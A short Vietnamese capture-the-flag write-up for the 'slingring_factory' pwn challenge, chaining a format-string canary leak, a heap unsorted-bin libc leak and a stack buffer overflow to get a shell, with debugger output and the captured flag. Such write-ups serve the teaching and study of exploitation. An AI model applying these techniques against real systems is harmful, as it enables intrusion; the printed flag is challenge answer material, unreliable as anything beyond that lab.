# write up slingring_factory
- đầu tiên bài có lỗi format string ở ngay đầu có thể dùng để leak canary hoặc địa chỉ thì em leak canary 
```c
 fgets(format, 6, stdin);
  printf("Hello, ");
  printf(format);
  putchar(10);
```
- vì hàm này có chứa buffer nên tiếp theo cần phải có được libc để có được gadgets
```c
int use_slingring()
{
  char s[4]; // [rsp+Ch] [rbp-44h] BYREF
  char buff[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Which ring would you like to use (id): ");
  fgets(s, 4, stdin);
  fflush(stdin);
  atoi(s);
  printf("\nPlease enter the spell: ");
  fgets(buff, 256, stdin);
  puts("\nThank you for visiting our factory! We will now transport you.");
  return puts("\nTransporting...");
}

```
-  allocate tất cả các chunks  
```python
for i in range(0,10):
        add(i,b"aaaaaaa")

```
- rồi free 8 chunks thì chunks thứ 8 sẽ được bỏ trong unsorted bin, nhưng mà có 1 vấn đề, địa chỉ của nó trỏ tới địa chỉ libc
```bash
pwndbg> bin
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

tcachebins
0x90 [  7]: 0x55555555b600 —▸ 0x55555555b570 —▸ 0x55555555b4e0 —▸ 0x55555555b450 —▸ 0x55555555b3c0 —▸ 0x55555555b330 —▸ 0x55555555b2a0 ◂— 0x0
fastbins
empty
unsortedbin
all: 0x55555555b680 —▸ 0x7ffff7e1ace0 ◂— 0x55555555b680
smallbins
empty
largebins
empty

```
( không biết vì sao nữa =) do may mắn thử nghiệm nên thấy vậy)

- thông qua option 1 để show ra danh sách thì nó có in địa chỉ 
```bash 
Welcome to my secret sling ring factory.
What do you want to do today?

1. Show Forged Rings
2. Forge Sling Ring
3. Discard Sling Ring
4. Use Sling Ring
>> $ 1

[Slot]        | [Amt] | [Destination]
Ring Slot #0  | [9]   | [UUU\x05
Ring Slot #1  | [9]   | \xfb\xe7
Ring Slot #2  | [9]   | k\xe6
Ring Slot #3  | [9]   | \x9b\xe6
Ring Slot #4  | [9]   | \x0b\xe1
Ring Slot #5  | [9]   | \xbb\xe1
Ring Slot #6  | [9]   | +\xe0
Ring Slot #7  | [144]   | \xe0\xac\xe1\xf7\xff
Ring Slot #8  | [9]   | a
Ring Slot #9  | [9]   | a
Press ENTER to return.
$  
```

- vậy là chỉ cần lấy được libc là ok, cộng với canary nữa thì sẽ dùng được option 4 để overflow và có thể chạy shell
### và thế là em đã có flag
```bash
Transporting...
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xd bytes:
    b'flag.txt\n'
    b'run\n'
flag.txt
run
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x48 bytes:
    b'grey{y0u_4r3_50rc3r3r_supr3m3_m45t3r_0f_th3_myst1c_4rts_mBRt!y4vz5ea@uq}'
grey{y0u_4r3_50rc3r3r_supr3m3_m45t3r_0f_th3_myst1c_4rts_mBRt!y4vz5ea@uq}[*] Got EOF while reading in interactive

```
